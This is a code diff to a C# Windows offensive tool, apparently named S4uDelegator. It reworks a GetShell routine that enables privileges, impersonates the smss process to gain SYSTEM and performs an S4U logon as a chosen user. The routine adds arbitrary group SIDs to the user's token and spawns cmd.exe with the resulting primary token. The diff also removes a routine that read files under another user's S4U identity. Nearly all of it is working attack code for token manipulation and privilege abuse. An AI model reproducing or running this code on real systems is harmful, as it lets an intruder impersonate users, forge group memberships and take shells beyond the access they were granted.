@@ -1,5 +1,6 @@
 ﻿using System;
-using System.IO;
+using System.Collections.Generic;
+using System.Runtime.InteropServices;
 using System.Security.Principal;
 using System.Text.RegularExpressions;
 using S4uDelegator.Interop;
@@ -9,84 +10,17 @@ namespace S4uDelegator.Library
     class Modules
     {
         public static bool GetShell(
-            string username,
-            string sid)
-        {
-            string domain = null;
-
-            Console.WriteLine();
-
-            if (!VerifyAccount(
-                ref domain,
-                ref username,
-                ref sid,
-                out string upn))
-            {
-                return false;
-            }
-
-            if (!string.IsNullOrEmpty(upn))
-            {
-                Console.WriteLine("[-] Target account for this function should be local account.\n");
-
-                return false;
-            }
-
-            Console.WriteLine("[>] Trying to get SYSTEM.");
-
-            IntPtr hCurrentToken = WindowsIdentity.GetCurrent().Token;
-            var privs = new string[] {
-                Win32Const.SE_DEBUG_NAME,
-                Win32Const.SE_IMPERSONATE_NAME
-            };
-
-            if (!Utilities.EnableMultiplePrivileges(hCurrentToken, privs))
-                return false;
-
-            privs = new string[] {
-                Win32Const.SE_TCB_NAME,
-                Win32Const.SE_ASSIGNPRIMARYTOKEN_NAME
-            };
-
-            if (!Utilities.ImpersonateAsSmss(privs))
-                return false;
-
-            IntPtr hS4uToken = Utilities.GetMsvS4uLogonToken(
-                username,
-                domain,
-                Win32Const.SECURITY_LOGON_TYPE.Batch);
-
-            if (hS4uToken == IntPtr.Zero)
-                return false;
-
-            bool status = Utilities.CreateTokenAssignedProcess(
-                hS4uToken,
-                "C:\\Windows\\System32\\cmd.exe");
-
-            Win32Api.CloseHandle(hS4uToken);
-
-            return status;
-        }
-
-
-        public static bool S4uReadFile(
             string domain,
             string username,
             string sid,
-            string path)
+            string[] extraSids)
         {
-            string fullPath = Path.GetFullPath(path);
+            var groupSids = new string[] { };
+
+            if (string.IsNullOrEmpty(domain))
+                domain = Environment.MachineName;
 
             Console.WriteLine();
-            Console.WriteLine("[>] Trying to read file with S4U logon.");
-            Console.WriteLine("    |-> Target Path : {0}", fullPath);
-
-            if (!File.Exists(fullPath))
-            {
-                Console.WriteLine("[-] Target file does not exist.\n");
-
-                return false;
-            }
 
             if (!VerifyAccount(
                 ref domain,
@@ -96,6 +30,9 @@ namespace S4uDelegator.Library
             {
                 return false;
             }
+
+            if (extraSids.Length > 0)
+                groupSids = VerifyGroupSids(extraSids);
 
             Console.WriteLine("[>] Trying to get SYSTEM.");
 
@@ -110,43 +47,65 @@ namespace S4uDelegator.Library
 
             privs = new string[] {
                 Win32Const.SE_TCB_NAME,
-                Win32Const.SE_IMPERSONATE_NAME
+                Win32Const.SE_ASSIGNPRIMARYTOKEN_NAME,
+                Win32Const.SE_INCREASE_QUOTA_NAME
             };
 
             if (!Utilities.ImpersonateAsSmss(privs))
                 return false;
 
-            IntPtr hS4uToken;
+            int error;
+            bool status;
+            IntPtr hImpersonationToken;
+            IntPtr hPrimaryToken;
 
             if (string.IsNullOrEmpty(upn))
             {
-                hS4uToken = Utilities.GetMsvS4uLogonToken(
+                hPrimaryToken = Utilities.GetMsvS4uLogonToken(
                     username,
                     domain,
-                    Win32Const.SECURITY_LOGON_TYPE.Network);
+                    Win32Const.SECURITY_LOGON_TYPE.Network,
+                    groupSids);
             }
             else
             {
-                hS4uToken = Utilities.GetKerbS4uLogonToken(
+                hImpersonationToken = Utilities.GetKerbS4uLogonToken(
                     username,
                     domain,
-                    Win32Const.SECURITY_LOGON_TYPE.Network);
+                    Win32Const.SECURITY_LOGON_TYPE.Network,
+                    groupSids);
+
+                if (hImpersonationToken == IntPtr.Zero)
+                    return false;
+
+                status = Win32Api.DuplicateTokenEx(
+                    hImpersonationToken,
+                    Win32Const.TokenAccessFlags.TOKEN_ALL_ACCESS,
+                    IntPtr.Zero,
+                    Win32Const.SECURITY_IMPERSONATION_LEVEL.SecurityAnonymous,
+                    Win32Const.TOKEN_TYPE.TokenPrimary,
+                    out hPrimaryToken);
+
+                Win32Api.CloseHandle(hImpersonationToken);
+
+                if (!status)
+                {
+                    error = Marshal.GetLastWin32Error();
+                    Console.WriteLine("[-] Failed to create primary token.");
+                    Console.WriteLine("    |-> {0}\n", Helpers.GetWin32ErrorMessage(error, false));
+
+                    return false;
+                }
             }
 
-            if (hS4uToken == IntPtr.Zero)
+            if (hPrimaryToken == IntPtr.Zero)
                 return false;
 
-            bool status = Utilities.ImpersonateThreadToken(hS4uToken);
+            status = Utilities.CreateTokenAssignedProcess(
+                hPrimaryToken,
+                "C:\\Windows\\System32\\cmd.exe");
 
-            Win32Api.CloseHandle(hS4uToken);
-
-            if (!status)
-                return false;
-
-            string content = File.ReadAllText(fullPath);
-            Console.WriteLine("\n[{0}]", fullPath);
-            Console.WriteLine(content);
-            Console.WriteLine();
+            Win32Api.CloseHandle(hPrimaryToken);
 
             return status;
         }
@@ -366,6 +325,56 @@ namespace S4uDelegator.Library
 
                 return false;
             }
+        }
+
+
+        private static string[] VerifyGroupSids(string[] groupSids)
+        {
+            var result = new List<string>();
+            string accountName;
+            var filter = new Regex(@"^(s|S)(-\d+)+$");
+
+            if (groupSids.Length > 0)
+            {
+                Console.WriteLine("[>] Group SID to add:");
+
+                for (var idx = 0; idx < groupSids.Length; idx++)
+                {
+                    if (!filter.IsMatch(groupSids[idx]))
+                        continue;
+                    else if (result.Contains(groupSids[idx].ToUpper()))
+                        continue;
+
+                    accountName = Helpers.ConvertSidStringToAccountName(
+                        ref groupSids[idx],
+                        out Win32Const.SID_NAME_USE peUse);
+
+                    if (string.IsNullOrEmpty(accountName))
+                    {
+                        Console.WriteLine(
+                            "    |-> [IGNORED] Failed to resolve {0}.",
+                            groupSids[idx].ToUpper());
+                    }
+                    else if ((peUse == Win32Const.SID_NAME_USE.SidTypeGroup) ||
+                        (peUse == Win32Const.SID_NAME_USE.SidTypeWellKnownGroup))
+                    {
+                        Console.WriteLine(
+                            "    |-> [VALID] {0} (SID : {1}) will be added.",
+                            accountName,
+                            groupSids[idx].ToUpper());
+                        result.Add(groupSids[idx].ToUpper());
+                    }
+                    else
+                    {
+                        Console.WriteLine(
+                            "    |-> [IGNORED] {0} (SID : {1}) is not group.",
+                            accountName,
+                            groupSids[idx].ToUpper());
+                    }
+                }
+            }
+
+            return result.ToArray();
         }
     }
 }
